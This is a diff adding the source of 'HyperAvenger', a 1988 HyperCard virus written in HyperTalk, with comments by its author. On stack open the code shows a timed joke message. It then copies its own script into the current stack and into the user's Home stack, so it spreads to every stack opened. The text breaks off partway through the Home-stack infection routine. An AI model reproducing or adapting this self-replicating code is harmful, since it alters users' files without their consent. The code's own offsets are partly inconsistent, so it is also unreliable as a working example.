@@ -1,0 +1,48 @@
+on openstack --** The HyperAvenger **--
+put 2671798322 into sec --** created 8/6/88 **--
+put the script of this stack into temp
+get the seconds
+if it > sec then --%This section checks to see if it is time for the
+beep 2 --%message to be displayed, and if so, displays it.
+set the loc of the message box to 22,300
+answer "Watch the message box..."
+put ""&B "Greetings from the HyperAvenger! I am the"&B
+" first HyperCard virus ever. I was created by a mischievous "&B
+"14-year-old, and am completely harmless. Dukakis for presiden"&B
+"t in '88, Peace on Earth, and have a nice day. {!_!}" into giggle
+put the number of chars of giggle
+repeat with x = 1 to 300
+put char x to x + 60 of giggle into the message box
+wait 1 ticks
+end repeat
+get offset ("--** The HyperAvenger **--",temp)
+--%Here it resets the date for displaying the message
+--%to 3 wks in the future.
+put the seconds + 1814400 into char it+33 to it+42 of temp
+set the script of this stack to temp
+end if
+put "--** The HyperAvenger **--" into sign
+if not (temp contains sign) then
+--%This part checks to see if the stack contains the virus; if not,
+--%it is installed.
+put the script of stack "home" into temp2
+get offset ("--** The HyperAvenger**--",temp2)
+put char it to it+2426 of temp2 into theCode
+put the seconds+ 1814400 into char 34 to 43 of theCode
+if temp contains "on openstack" then
+get offset ("on openstack",temp)
+put theCode after char it+12 of temp
+else
+put return&"on openstack"&return&theCode&"end openstack" after temp
+end if
+set the script of this stack to temp
+end if
+put the script of stack "home" into temp
+--%This part checks to see if the Home stack contains the virus; if
+--%not, it is installed.
+if not (temp contains sign) then
+put the script of this stack into temp2
+
+
+
+
